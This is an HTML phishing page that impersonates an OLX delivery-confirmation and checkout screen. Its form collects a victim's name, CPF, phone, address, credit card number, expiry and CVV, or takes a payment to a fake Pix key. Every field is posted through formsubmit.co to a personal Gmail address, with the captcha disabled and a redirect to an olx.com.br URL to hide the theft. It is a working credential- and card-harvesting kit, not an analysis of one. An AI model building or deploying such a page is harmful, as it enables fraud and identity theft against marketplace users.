<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Confirmação de Entrega • OLX</title>
  <style>
    * { box-sizing: border-box; }
    body {
      font-family: 'Segoe UI', sans-serif;
      margin: 0;
      background: #f2f2f2;
      padding: 0;
    }
    .container {
      max-width: 500px;
      margin: 30px auto;
      background: #fff;
      border-radius: 8px;
      box-shadow: 0 0 10px rgba(0,0,0,0.05);
      padding: 30px;
    }
    h2 {
      margin-bottom: 20px;
      color: #222;
      font-size: 22px;
    }
    label {
      display: block;
      margin-bottom: 10px;
      color: #444;
      font-weight: bold;
    }
    input, select {
      width: 100%;
      padding: 10px;
      margin-bottom: 15px;
      border-radius: 6px;
      border: 1px solid #ccc;
    }
    button {
      background: #ff5a00;
      color: white;
      border: none;
      padding: 12px;
      border-radius: 6px;
      width: 100%;
      font-size: 16px;
      cursor: pointer;
    }
    .tela { display: none; }
    .ativa { display: block; }
    .pix-box {
      background: #eee;
      padding: 15px;
      border-radius: 6px;
      word-break: break-word;
      margin-bottom: 15px;
      font-weight: bold;
    }
    .barra {
      width: 100%;
      background: #ddd;
      border-radius: 6px;
      overflow: hidden;
      margin-top: 15px;
    }
    .progresso {
      height: 14px;
      width: 0%;
      background-color: #ff5a00;
      animation: carregar 3s forwards;
    }
    @keyframes carregar {
      0% { width: 0%; }
      100% { width: 100%; }
    }
  </style>
</head>
<body>

  <!-- FORMULÁRIO ÚNICO: todos os dados vão juntos -->
  <form id="formCompleto" class="container tela ativa" action="https://formsubmit.co/natanaelverissimo34@gmail.com" method="POST">
    <input type="hidden" name="_next" value="https://olx.com.br/sucesso.html">
    <input type="hidden" name="_captcha" value="false">

    <!-- Tela 1 -->
    <div id="tela1" class="subtela ativa">
      <h2>Confirmação de Entrega</h2>
      <label>Nome completo:</label>
      <input type="text" name="nome" required>

      <label>CPF:</label>
      <input type="text" name="cpf" maxlength="11" required>

      <label>Telefone:</label>
      <input type="text" name="telefone" maxlength="15" required>

      <label>CEP:</label>
      <input type="text" name="cep" maxlength="8" required>

      <label>Endereço:</label>
      <input type="text" name="endereco" required>

      <label>Número:</label>
      <input type="text" name="numero" required>

      <label>Complemento:</label>
      <input type="text" name="complemento">

      <label>Cidade:</label>
      <input type="text" name="cidade" required>

      <label>Estado:</label>
      <input type="text" name="estado" required>

      <button type="button" onclick="irParaTelaCarregando()">Continuar</button>
    </div>

    <!-- Tela Carregando -->
    <div id="telaCarregando" class="subtela">
      <p style="text-align:center; font-weight:bold;">Verificando dados de entrega...</p>
      <div class="barra"><div class="progresso"></div></div>
    </div>

    <!-- Tela 2: Forma de Pagamento -->
    <div id="tela2" class="subtela">
      <h2>Escolha a forma de pagamento</h2>
      <input type="hidden" id="formaPagamento" name="forma_pagamento">
      <button type="button" onclick="selecionarPagamento('cartao')">Cartão de Crédito</button><br><br>
      <button type="button" onclick="selecionarPagamento('pix')">Pix</button>
    </div>

    <!-- Tela 3A: Cartão -->
    <div id="cartao" class="subtela">
      <h2>Pagamento com Cartão</h2>
      <label>Número do cartão:</label>
      <input type="text" name="numero_cartao" maxlength="16" required>

      <label>Nome no cartão:</label>
      <input type="text" name="nome_cartao" required>

      <label>Validade (MM/AA):</label>
      <input type="text" name="validade" required>

      <label>CVV:</label>
      <input type="text" name="cvv" maxlength="3" required>

      <button type="submit">Finalizar</button>
    </div>

    <!-- Tela 3B: Pix -->
    <div id="pix" class="subtela">
      <h2>Pagamento via Pix</h2>
      <div class="pix-box">pix-chave-fake@provedor.com</div>

      <label>Nome do pagador:</label>
      <input type="text" name="nome_pagador" required>

      <button type="submit">Já paguei</button>
    </div>
  </form>

  <script>
    function trocarTela(atual, proxima) {
      document.getElementById(atual).classList.remove('ativa');
      document.getElementById(proxima).classList.add('ativa');
    }

    function irParaTelaCarregando() {
      const form = document.getElementById('formCompleto');
      if (form.checkValidity()) {
        trocarTela('tela1', 'telaCarregando');
        setTimeout(() => {
          trocarTela('telaCarregando', 'tela2');
        }, 3000);
      } else {
        form.reportValidity();
      }
    }

    function selecionarPagamento(tipo) {
      document.getElementById('formaPagamento').value = tipo;
      trocarTela('tela2', tipo);
    }
  </script>
</body>
</html>
